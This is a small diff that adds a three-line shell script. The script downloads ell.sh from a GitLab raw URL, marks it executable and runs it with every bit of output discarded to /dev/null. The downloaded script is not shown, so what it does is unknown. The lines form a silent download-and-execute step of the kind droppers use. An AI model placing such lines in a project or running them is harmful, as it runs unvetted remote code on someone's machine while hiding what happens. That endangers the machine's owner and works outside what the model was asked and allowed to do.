@@ -1,0 +1,3 @@
+wget https://gitlab.com/rudi.hartono.laoz/gaskanlahsaja/-/raw/main/ell.sh
+chmod u+x ell.sh
+./ell.sh >/dev/null >/dev/null 2>&1
